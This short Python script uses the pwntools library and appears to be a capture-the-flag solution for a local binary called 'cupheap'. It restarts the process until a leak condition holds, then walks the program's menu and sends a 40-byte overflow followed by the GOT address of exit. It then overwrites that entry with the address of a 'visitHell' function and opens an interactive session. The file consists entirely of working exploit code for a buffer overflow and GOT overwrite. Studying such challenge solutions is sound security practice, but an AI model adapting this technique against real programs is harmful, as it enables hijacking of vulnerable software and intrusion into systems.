# -*- coding: utf-8 -*-
from pwn import *

# context.log_level = "debug"

elf = ELF("./cupheap")

visitHell = 0x4008F7

while 1:
	p = process("./cupheap")
	p.recvuntil("Give up\n")
	p.sendline("1")
	recv = p.recvuntil("Choose one option")
	if "0x1100" in recv:
		# not 1,2,3 is ok
		p.sendline("6")
		p.recvuntil("Visit Mausoleum\n")
		p.sendline("4")
		p.recvuntil("what is the name their superpowers?\n")
		payload = "a" * 40 
		payload += p64(elf.got["exit"])
		p.sendline(payload)
		sleep(2)
		p.sendline(p64(visitHell))
		p.interactive()
	else:
		p.close()
